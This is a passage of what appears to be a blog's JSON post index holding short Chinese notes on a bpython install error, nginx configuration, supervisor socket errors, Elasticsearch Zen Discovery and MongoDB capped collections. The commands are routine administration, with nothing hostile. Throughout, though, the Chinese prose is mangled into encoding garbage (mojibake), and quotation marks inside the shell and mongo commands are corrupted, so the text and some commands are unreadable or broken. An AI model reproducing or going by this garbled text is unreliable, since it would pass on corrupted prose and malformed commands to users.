configsvrå‚è€ƒï¼šhttp://www.cnblogs.com/browse.php/qU6OBjJU/826tGhve/bJ9SC7wT/v7cG_2B8/xWQLvQPJ/u3IupC7k/TRcm7Xic/DtI2mMYX/oRXv4UQO/FTlYV5BH/E_3D/b29/åˆ†ç±»: http://www.cnblogs.com/cy163/category/674910.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"bpython å®‰è£…æŠ¥é”™","slug":"history/tech/5953c4d0c2b92f5665eeda0f","date":"2016-03-26T02:24:35.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda0f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda0f/","excerpt":"","text":"pip install bpythonæŠ¥é”™ï¼šCommand /usr/bin/python -c â€œimport setuptools, tokenize;file=â€™/tmp/pip_build_root/greenlet/setup.pyâ€™;exec(compile(getattr(tokenize, â€˜openâ€™, open)(file).read().replace(â€™\\r\\nâ€™, â€˜\\nâ€™), file, â€˜execâ€™))â€ install --record /tmp/pip-KtlxRN-record/install-record.txt --single-version-externally-managed --compile failed with error code 1 in /tmp/pip_build_root/greenletStoring debug log for failure in /root/.pip/pip.logè§£å†³ï¼šsudo apt-get install python-devpython3 å¯èƒ½çš„è§£å†³æ–¹æ¡ˆ(æœªå°è¯•)ï¼šsudo zypper install python3-develfor opensuse, install â€œpython3-develâ€ â€“ kmonsoor Mar 29 '15 at 8:17sudo apt-get install python3-devsudo apt-get install python3.3-dev","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"æ£€æµ‹nginxé…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡®","slug":"history/tech/5953c4d0c2b92f5665eeda16","date":"2016-03-25T21:17:13.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda16/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda16/","excerpt":"","text":"/usr/local/nginx/sbin/nginx -t -c nginx.conf","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nginx","slug":"nginx","permalink":"https://wangxiuwen.github.io/tags/nginx/"}],"author":"wangxiuwen"},{"title":"server_names_hash_bucket_size","slug":"history/tech/5953c4d0c2b92f5665eeda15","date":"2016-03-25T19:25:09.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda15/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda15/","excerpt":"","text":"nginx: could not build the server_names_hash, you should increase server_names_hash_bucket_size: 32nginx: configuration file /etc/nginx/nginx.conf test failedåœ¨é…ç½®æ–‡ä»¶çš„http{}æ®µå¢åŠ ä¸€è¡Œé…ç½®server_names_hash_bucket_size 64;å¦‚æœ64è¿˜ä¸å¤Ÿï¼Œé‚£ä¹ˆå°±æŒ‰32çš„å€æ•°å¾€ä¸ŠåŠ ã€‚ä¸‹é¢æ˜¯åœ¨ä¸­æ–‡wikiä¸Šæ‘˜æŠ„çš„ä¸€æ®µè¯´æ˜ï¼šä¿å­˜æœåŠ¡å™¨åå­—çš„hashè¡¨æ˜¯ç”±æŒ‡ä»¤ server_names_hash_max_size å’Œ server_names_hash_bucket_sizeæ‰€æ§åˆ¶çš„ã€‚å‚æ•°hash bucket sizeæ€»æ˜¯ç­‰äºhashè¡¨çš„å¤§å°ï¼Œå¹¶ä¸”æ˜¯ä¸€è·¯å¤„ç†å™¨ç¼“å­˜å¤§å°çš„å€æ•°ã€‚åœ¨å‡å°‘äº†åœ¨å†…å­˜ä¸­çš„å­˜å–æ¬¡æ•°åï¼Œä½¿åœ¨å¤„ç†å™¨ä¸­åŠ é€ŸæŸ¥æ‰¾hashè¡¨é”®å€¼æˆä¸ºå¯èƒ½ã€‚å¦‚æœ hash bucket sizeç­‰äºä¸€è·¯å¤„ç†å™¨ç¼“å­˜çš„å¤§å°ï¼Œé‚£ä¹ˆåœ¨æŸ¥æ‰¾é”®çš„æ—¶å€™ï¼Œæœ€åçš„æƒ…å†µä¸‹åœ¨å†…å­˜ä¸­æŸ¥æ‰¾çš„æ¬¡æ•°ä¸º2ã€‚ç¬¬ä¸€æ¬¡æ˜¯ç¡®å®šå­˜å‚¨å•å…ƒçš„åœ°å€ï¼Œç¬¬äºŒæ¬¡æ˜¯åœ¨å­˜å‚¨å•å…ƒä¸­æŸ¥æ‰¾é”®å€¼ã€‚å› æ­¤ï¼Œå¦‚æœNginxç»™å‡ºéœ€è¦å¢å¤§ hash max size æˆ– hash bucket sizeçš„æç¤ºï¼Œé‚£ä¹ˆé¦–è¦çš„æ˜¯å¢å¤§å‰ä¸€ä¸ªå‚æ•°çš„å¤§å°.","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nginx","slug":"nginx","permalink":"https://wangxiuwen.github.io/tags/nginx/"}],"author":"wangxiuwen"},{"title":"supervisor.sock no such file","slug":"history/tech/5953c4d0c2b92f5665eeda14","date":"2016-03-25T19:05:07.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda14/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda14/","excerpt":"","text":"supervisorä½œä¸ºä¸€ä¸ªè¿›ç¨‹ç®¡ç†çš„pythonè½¯ä»¶éå¸¸çš„ç»™åŠ› ä½†æ˜¯ä¸€ä¸å°å¿ƒå°±ä¼šé‡åˆ°ä¸€äº›é—®é¢˜ å°±æ¯”å¦‚ä¸‹é¢è¿™ä¸ª:unix:///var/run/supervisor.sock no such fileè¿™ä¸ªé—®é¢˜ä¸€èˆ¬æ¥è¯´ æœ‰å‡ ä¸ªåŸå› :supervisordæ²¡æœ‰è¿è¡Œèµ·æ¥.æ˜æ˜å·²ç»è¿è¡Œèµ·æ¥äº†ä»–å°±æ˜¯è¯´æ²¡æœ‰.è€Œä¸”æ ¹æ®æˆ‘çš„å°è¯• å¦‚æœä½¿ç”¨ubuntu, é‚£ä¹ˆè¿›è¡Œä¸‹é¢çš„æ“ä½œ 100000% ä¼šæŒ‚æ‰è€Œä¸”æŠ¥é”™:å®‰è£…: sudo apt-get install supervisorä½¿ç”¨: sudo service supervisor start sudo supervisorctlè¿™é‡Œéƒ½æ˜¯å¾ˆæ­£å¸¸çš„ä½†æ˜¯å¦‚æœåœ¨ç¬¬ä¸€æ¬¡è¿è¡Œå å†å°è¯•è¿è¡Œ: sudo supervisorctl reloadæˆ–è€…åœ¨supervisorctlé‡Œé¢è¿è¡Œ reloadé‚£ä¹ˆè¿™ä¸ªæœåŠ¡å°±æ°¸è¿œè·‘ä¸èµ·æ¥äº†.ä¸Šç½‘æœäº†å¥½å¤š ç»“æœéƒ½æ²¡æœ‰å¾ˆå¥½çš„è§£å†³æ–¹æ³•. è¿›è¡Œå°è¯•äº†å¾ˆä¹… ç»ˆäºå‘ç°å¯ä»¥è§£å†³çš„æ–¹æ³•äº†:é¦–å…ˆåˆ é™¤é€šè¿‡apt-getå®‰è£…çš„supervisor: sudo apt-get remove supervisorç„¶å sudo ps -ef | grep supervisoræ‰¾åˆ°å¯¹åº”çš„è¿›ç¨‹killæ‰.å†ç„¶å:sudo easy_install(pip install) supervisor==3.2.3æ³¨æ„ è¿™é‡Œå°±æ˜¯é‡ç‚¹:é€šè¿‡apt-getå®‰è£…çš„supervisor ç‰ˆæœ¬å·æ˜¯3.0a8, è€Œå½“ä½ ç¬¬ä¸€æ¬¡å®‰è£…è¿™ä¸ªç‰ˆæœ¬ä¹‹å å†ç”¨easy_installçš„è¯ å°±ä¹Ÿæ˜¯è¿™ä¸ªç‰ˆæœ¬ è€Œä¸æ˜¯æœ€æ–°ç‰ˆçš„3.2.3ç„¶åç”Ÿæˆé…ç½®æ–‡ä»¶(rootæƒé™): echo_supervisord_conf &gt; /etc/supervisord.confå†ç„¶å: sudo supervisordå†ç„¶å: sudo supervisorctlå¯åŠ¨æˆåŠŸ.æœ€åè¯´æ˜:ä½¿ç”¨easy_installå®‰è£…çš„supervisorçš„é»˜è®¤sockæ–‡ä»¶ ä¼šè¢«å®šä¹‰åœ¨/tmpä¸‹é¢ è€Œapt-getä¼šåœ¨/var/runä¸‹é¢. é‰´äºapt-getä¼šå‡ºç°å„ç§é—®é¢˜ è¿™é‡Œå»ºè®®ä½¿ç”¨easy_installæˆ–æ˜¯pipå®‰è£… supervisor.","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"elasticsearch Zen Discovery","slug":"history/tech/5953c4d0c2b92f5665eeda0d","date":"2016-03-15T18:20:06.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda0d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda0d/","excerpt":"","text":"elasticsearché›†ç¾¤å‘ç°æœºåˆ¶æœ‰ä¸¤ç§ï¼šZen Discoveryå’Œ EC2 discoveryã€‚EC2ï¼šäºšé©¬é€Šå¼¹æ€§è®¡ç®—äº‘ã€‚Zen Discoveryä½œç”¨å°±ç›¸å½“äºsolrcloudä¸­çš„zookeeperã€‚EC2 discoveryä¸»è¦åœ¨äºšé©¬äº‘å¹³å°ä¸­ä½¿ç”¨ã€‚Zen****å‘ç°æœºåˆ¶zenå‘ç°æœºåˆ¶æ˜¯elasticsearché»˜è®¤çš„å†…å»ºæ¨¡å—ã€‚å®ƒæä¾›äº†å¤šæ’­å’Œå•æ’­ä¸¤ç§å‘ç°æ–¹å¼ï¼Œèƒ½å¤Ÿå¾ˆå®¹æ˜“çš„æ‰©å±•è‡³äº‘ç¯å¢ƒã€‚zenå‘ç°æœºåˆ¶æ˜¯å’Œå…¶ä»–æ¨¡å—é›†æˆçš„ï¼Œä¾‹å¦‚æ‰€æœ‰èŠ‚ç‚¹é—´é€šè®¯å¿…é¡»ç”¨trasportæ¨¡å—æ¥å®Œæˆã€‚å®ƒåˆ†æˆå‡ ä¸ªå­æ¨¡å—ï¼Œä¸‹é¢è¯¦ç»†è§£é‡Šï¼šPingè¿™æ˜¯ä¸€ä¸ªèŠ‚ç‚¹ä½¿ç”¨å‘ç°æœºåˆ¶å»å¯»æ‰¾å…¶ä»–èŠ‚ç‚¹çš„è¿›ç¨‹ã€‚åŒæ—¶æ”¯æŒå¤šæ’­å’Œå•æ’­æ–¹å¼çš„å‘ç°ï¼ˆä¹Ÿå¯ä»¥ç»„åˆä½¿ç”¨ï¼‰å¤šæ’­å¤šæ’­pingå‘ç°çš„æ–¹å¼é€šè¿‡å‘å…¶ä»–èŠ‚ç‚¹å‘é€ä¸€ä¸ªæˆ–å¤šä¸ªå¤šæ’­è¯·æ±‚æ¥å®ç°ï¼Œå­˜åœ¨çš„èŠ‚ç‚¹å°†ä¼šæ¥æ”¶å¹¶ä¸”å“åº”ã€‚æä¾›ä¸‹é¢çš„ä¸€ç»„é…ç½®ï¼Œä»¥discovery.zen.ping.multicaståšå‰ç¼€ï¼šé…ç½® æè¿°group é»˜è®¤å€¼ä¸º224.2.2.4port é»˜è®¤å€¼ä¸º54328ttl å¤šæ’­æ¶ˆæ¯çš„ttlã€‚é»˜è®¤ä¸º3address ç»‘å®šçš„åœ°å€ï¼Œé»˜è®¤ä¸ºnullï¼Œå³ç»‘å®šæ‰€æœ‰å¯ç”¨çš„networkæ¥å£ã€‚å°†elasticsearch.yml é…ç½®multicast.enabledè®¾ä¸ºfalseå¯ä»¥ç¦ç”¨å¤šæ’­æ–¹å¼ã€‚å•æ’­ä½†å¤šæ’­ç¦ç”¨çš„æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨å•æ’­å‘ç°ã€‚éœ€è¦æä¾›ä¸€ä¸ªä¸»æœºåˆ—è¡¨ä½œä¸ºè·¯ç”±åˆ—è¡¨ã€‚æä¾›ä¸‹é¢ä¸€ç»„é…ç½®ï¼Œä»¥discovery.zen.ping.unicastä½œä¸ºå‰ç¼€ï¼šé…ç½® æè¿°hosts æ˜¯ä¸€ä¸ªæ•°ç»„çš„é…ç½®ï¼Œæˆ–ä»¥é€—å·åˆ†éš”çš„å­—ç¬¦ä¸²ã€‚æ ¼å¼ä¸ºhost:portï¼Œæˆ–è€…hostå•æ’­å‘ç°ä¾èµ–transportæ¨¡å—å®ç°ã€‚æ³¨æ„porté»˜è®¤åº”è¯¥æ˜¯9300ï¼Œä¸æ˜¯9200ï¼Œå› ä¸ºä½¿ç”¨çš„æ˜¯tranposrtã€‚ä¸»èŠ‚ç‚¹é€‰ä¸¾ä½œä¸ºåˆå§‹pingè¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ï¼Œä¸€ä¸ªé›†ç¾¤çš„ä¸»èŠ‚ç‚¹éœ€è¦è¢«é€‰ä¸¾æˆ–åŠ å…¥ã€‚è¿™æ˜¯è‡ªåŠ¨å®Œæˆçš„ã€‚discovery.zen.ping_timeout(é»˜è®¤3ç§’)çš„é…ç½®ç”¨äºå¤„ç†ç½‘ç»œé€Ÿåº¦æ…¢æˆ–ç½‘ç»œæ‹¥å¡çš„åœºæ™¯ã€‚æ³¨æ„è¿™ä¸ªé…ç½®ä»0.15.1å¾€åå‘ç”Ÿäº†å˜åŒ–ï¼ˆä¹‹å‰å«discovery.zen.initial_ping_timeoutï¼‰èŠ‚ç‚¹åœ¨æˆä¸ºä¸»èŠ‚ç‚¹ä¹‹åå¯ä»¥é€šè¿‡å°†node.masterè®¾ä¸ºfalseæ¥é€€å‡ºã€‚æ³¨æ„ï¼Œä¸€æ—¦ä¸€ä¸ªèŠ‚ç‚¹è¢«æ˜ç¡®è®¾ä¸ºä¸€ä¸ªå®¢æˆ·ç«¯èŠ‚ç‚¹ï¼ˆnode.clientè®¾ä¸ºtrueï¼‰ï¼Œåˆ™ä¸èƒ½å†æˆä¸ºä¸»èŠ‚ç‚¹ï¼ˆnode.masterä¼šè‡ªåŠ¨è®¾ä¸ºfalseï¼‰ã€‚discovery.zen.minimum_master_nodesç”¨äºæ§åˆ¶é€‰ä¸¾è¡Œä¸ºå‘ç”Ÿçš„æœ€å°é›†ç¾¤èŠ‚ç‚¹æ•°é‡ã€‚æ¨èè®¾ä¸ºå¤§äº1çš„æ•°å€¼ï¼Œå› ä¸ºåªæœ‰åœ¨2ä¸ªä»¥ä¸ŠèŠ‚ç‚¹çš„é›†ç¾¤ä¸­ï¼Œä¸»èŠ‚ç‚¹æ‰æ˜¯æœ‰æ„ä¹‰çš„ã€‚é”™è¯¯æ£€æµ‹æœ‰ä¸¤ç§é”™è¯¯æ£€æµ‹çš„è¿›ç¨‹åœ¨è¿è¡Œã€‚ç¬¬ä¸€ç§æ˜¯åœ¨ä¸»èŠ‚ç‚¹ä¸Šï¼Œç”¨äºpingæ‰€æœ‰å…¶ä»–çš„é›†ç¾¤èŠ‚ç‚¹ï¼Œå¹¶éªŒè¯å®ƒä»¬æ˜¯å¦å­˜æ´»ã€‚å¦ä¸€ç§æ˜¯å…¶ä»–èŠ‚ç‚¹pingä¸»èŠ‚ç‚¹ï¼Œçœ‹ä¸»èŠ‚ç‚¹æ˜¯å¦å­˜æ´»ï¼Œæˆ–è€…æ˜¯å¦éœ€è¦åˆå§‹åŒ–é€‰ä¸¾è¿›ç¨‹ã€‚ä¸‹é¢çš„é…ç½®ç”¨äºé”™è¯¯æ£€æµ‹ï¼Œä»¥discovery.zen.fdprefixä¸ºå‰ç¼€ï¼šé…ç½® æè¿°ping_interval èŠ‚ç‚¹pingçš„é¢‘ç‡ã€‚é»˜è®¤ä¸º1ç§’ã€‚ping_timeout ç­‰å¾…èŠ‚ç‚¹å“åº”çš„è¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤ä¸º30ç§’ping_retries pingå¤±è´¥/è¶…æ—¶é‡è¯•æ¬¡æ•°ã€‚é»˜è®¤ä¸º3.å¤–éƒ¨å¤šæ’­å¤šæ’­å‘ç°ä¹Ÿæ”¯æŒç”¨å¤–éƒ¨å¤šæ’­è¯·æ±‚æ¥å‘ç°èŠ‚ç‚¹ã€‚å¤–éƒ¨å®¢æˆ·ç«¯å¯ä»¥å‘é€å¤šæ’­IP/groupå’Œç«¯å£è¯·æ±‚ï¼Œæ ¼å¼ä¸ºï¼š{ â€œrequestâ€ : { â€œcluster_nameâ€ : â€œtest_clusterâ€ }}è¿”å›çš„å“åº”ä¿¡æ¯æ ¼å¼å’ŒèŠ‚ç‚¹ä¿¡æ¯çš„è¿”å›æ ¼å¼ç±»ä¼¼ï¼ˆä»…ä»…æ˜¯èŠ‚ç‚¹çº§åˆ«çš„ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯åŒ…å«transport/httpåœ°å€ï¼Œä»¥åŠèŠ‚ç‚¹å±æ€§ï¼‰ï¼š{ â€œresponseâ€ : { â€œcluster_nameâ€ : â€œtest_clusterâ€, â€œtransport_addressâ€ : â€œâ€¦â€, â€œhttp_addressâ€ : â€œâ€¦â€, â€œattributesâ€ : { â€œâ€¦â€ } }}æ³¨æ„ï¼Œå¯ä»¥åšåˆ°ç¦ç”¨å†…éƒ¨å¤šæ’­å‘ç°ï¼Œä½†æ˜¯å¯ç”¨å¤–éƒ¨å¤šæ’­å‘ç°æœºåˆ¶ã€‚æ–¹å¼ä¸ºå°†discovery.zen.ping.multicast.enabledè®¾ä¸ºtrueï¼ˆé»˜è®¤å€¼ï¼‰ï¼Œä½†æ˜¯å°†discovery.zen.ping.multicast.ping.enabledè®¾ä¸ºfalse","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://wangxiuwen.github.io/tags/elasticsearch/"}],"author":"wangxiuwen"},{"title":"Capped Collection","slug":"history/tech/5953c4d0c2b92f5665eeda0c","date":"2016-03-14T21:59:47.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda0c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda0c/","excerpt":"","text":"MongoDB æ”¯æŒ Capped Collectionï¼Œä¸€ç§å›ºå®šå¤§å°çš„é›†åˆï¼Œå½“é›†åˆçš„å¤§å°è¾¾åˆ°æŒ‡å®šå¤§å°æ—¶ï¼Œ æ–°æ•°æ®è¦†ç›–è€æ•°æ®ï¼ŒMongoDB Replica set ä¸­çš„ oplog å°±æ˜¯ Capped Collection ç±»å‹ã€‚â€“1 æŸ¥çœ‹ oplog æ˜¯å¦æ˜¯ Capped Collection$ mongo 127.0.0.1:27018MongoDB shell version: 2.2.1connecting to: 127.0.0.1:27018/test rs0:PRIMARY&gt; use local;switched to db localrs0:PRIMARY&gt; show collections;meoplog.rsreplset.minvalidslavessystem.indexessystem.replsetrs0:PRIMARY&gt; db.oplog.rs.isCapped();trueå¤‡æ³¨ï¼šé€šè¿‡ db.collection.isCapped() å‘½ä»¤å¯ä»¥æŸ¥çœ‹ä¸€ä¸ªé›†åˆæ˜¯å¦æ˜¯ Capped Collection ã€‚Capped Collection å…·æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼Œåœ¨ä½¿ç”¨çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼š1 ä¸å¯ä»¥å¯¹ Capped Collection è¿›è¡Œåˆ†ç‰‡ã€‚2 åœ¨ 2.2 ç‰ˆæœ¬ä»¥åï¼Œåˆ›å»ºçš„Capped Collection é»˜è®¤åœ¨ _id å­—æ®µä¸Šåˆ›å»ºç´¢å¼•ï¼Œè€Œåœ¨ 2.2 ç‰ˆæœ¬æˆ–ä»¥å‰æ²¡æœ‰ã€‚3 åœ¨ Capped Collection æ’å…¥æ–‡æ¡£åå¯ä»¥è¿›è¡Œæ›´æ–°(update)æ“ä½œï¼Œå½“æ›´æ–°ä¸èƒ½å¯¼è‡´åŸæ¥æ–‡æ¡£å ç”¨ ç©ºé—´å¢é•¿ï¼Œå¦åˆ™æ›´æ–°å¤±è´¥ã€‚4 ä¸å¯ä»¥å¯¹ capped collection æ‰§è¡Œåˆ é™¤æ–‡æ¡£æ“ä½œï¼Œä½†å¯ä»¥åˆ é™¤æ•´ä¸ªé›†åˆã€‚æ¥ä¸‹æ¥ä¼šæµ‹è¯•å…¶ä¸­çš„éƒ¨åˆ†ç‰¹æ€§ã€‚â€“2 åˆ›å»º Capped Collectionrs0:PRIMARY&gt; db.createCollection(â€œmycoll1â€,{capped:true,size:1024}); { â€œokâ€ : 1 } å¤‡æ³¨ï¼šé€šè¿‡ db.createCollection å‘½ä»¤åˆ›å»º Capped Collection é›†åˆï¼Œåˆ›å»ºæ—¶å¿…é¡»æŒ‡å®š é›†åˆå¤§å°ï¼Œç”¨äºé¢„å…ˆåˆ†é…ç©ºé—´ã€‚â€“3 æŸ¥çœ‹ä¸€ä¸ªé›†åˆæ˜¯å¦æ˜¯ Capped Collectionå¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹æ³•æŸ¥çœ‹ä¸€ä¸ªé›†åˆæ˜¯å¦æ˜¯ Capped Collection ã€‚rs0:PRIMARY&gt; db.mycoll1.isCapped();true rs0:PRIMARY&gt; db.mycoll1.stats();{â€œnsâ€ : â€œtest.mycoll1â€,â€œcountâ€ : 0,â€œsizeâ€ : 0,â€œstorageSizeâ€ : 4096,â€œnumExtentsâ€ : 1,â€œnindexesâ€ : 1,â€œlastExtentSizeâ€ : 4096,â€œpaddingFactorâ€ : 1,â€œsystemFlagsâ€ : 1,â€œuserFlagsâ€ : 0,â€œtotalIndexSizeâ€ : 8176,â€œindexSizesâ€ : {â€œidâ€ : 8176},â€œcappedâ€ : true,â€œmaxâ€ : 2147483647,â€œokâ€ : 1}å¤‡æ³¨ï¼šâ€œcappedâ€ å±æ€§ä¸º true è¡¨ç¤ºæ˜¯ Capped Collection ã€‚â€“4 æµ‹è¯•ï¼šæ’å…¥è®°å½•rs0:PRIMARY&gt; for (var i = 1; i &lt;= 10000; i++) db.mycoll1.save({id : i, name : â€˜francsâ€™}); rs0:PRIMARY&gt; db.mycoll1.find().count();56rs0:PRIMARY&gt; db.mycoll1.find();{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db7fâ€), â€œidâ€ : 9945, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db80â€), â€œidâ€ : 9946, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db81â€), â€œidâ€ : 9947, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db82â€), â€œidâ€ : 9948, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db83â€), â€œidâ€ : 9949, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db84â€), â€œidâ€ : 9950, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db85â€), â€œidâ€ : 9951, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db86â€), â€œidâ€ : 9952, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db87â€), â€œidâ€ : 9953, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db88â€), â€œidâ€ : 9954, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db89â€), â€œidâ€ : 9955, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db8aâ€), â€œidâ€ : 9956, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db8bâ€), â€œidâ€ : 9957, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db8câ€), â€œidâ€ : 9958, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db8dâ€), â€œidâ€ : 9959, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db8eâ€), â€œidâ€ : 9960, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db8fâ€), â€œidâ€ : 9961, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db90â€), â€œidâ€ : 9962, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db91â€), â€œidâ€ : 9963, â€œnameâ€ : â€œfrancsâ€ }{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db92â€), â€œidâ€ : 9964, â€œnameâ€ : â€œfrancsâ€ }Type â€œitâ€ for moreå¤‡æ³¨ï¼šç”±äºé™åˆ¶äº†é›†åˆå¤§å°ä¸å°ï¼Œç›®æ ‡æ’å…¥ 10000 æ¡ï¼Œç»“æœåªæ’å…¥äº† 56 æ¡æ•°æ®ï¼Œå¹¶ä¸”è€æ•°æ®è¢«æ–°æ•°æ® è¦†ç›–ã€‚å¦å¤–ä¸å¯ä»¥åˆ é™¤ Capped Collection çš„æ–‡æ¡£ï¼Œä¸‹é¢æµ‹è¯•ä¸‹ã€‚â€“5 æµ‹è¯•ï¼š åˆ é™¤ capped collection ä¸­çš„æ–‡æ¡£rs0:PRIMARY&gt; db.mycoll1.remove({id:9956});canot remove from a capped collectionå¤‡æ³¨ï¼šåˆ é™¤æ–‡æ¡£æ—¶æŠ›å‡ºå¼‚å¸¸ã€‚â€“6 æµ‹è¯•ï¼šæ›´æ–° capped collection ä¸­çš„æ–‡æ¡£rs0:PRIMARY&gt; db.mycoll1.find({id:9956});{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db8aâ€), â€œidâ€ : 9956, â€œnameâ€ : â€œfrancsâ€ } rs0:PRIMARY&gt; db.mycoll1.update({id:9956},{set:{name:'aaa_francs'}}); failing update: objects in a capped ns cannot grow rs0:PRIMARY> db.mycoll1.update({id:9956},{set:{name:â€˜bbbâ€™}});rs0:PRIMARY&gt; db.mycoll1.find({id:9956});{ â€œ_idâ€ : ObjectId(â€œ50b811cf68b1911e7096db8aâ€), â€œidâ€ : 9956, â€œnameâ€ : â€œbbbâ€ }å¤‡æ³¨ï¼šè¿™é‡Œæ­£å¥½éªŒè¯äº†ç‰¹æ€§3ï¼Œæ›´æ–°åçš„å€¼ä¸èƒ½è¶…è¿‡åŸæœ‰ç©ºé—´ï¼Œå¦åˆ™æ›´æ–°å¤±è´¥ã€‚â€“7 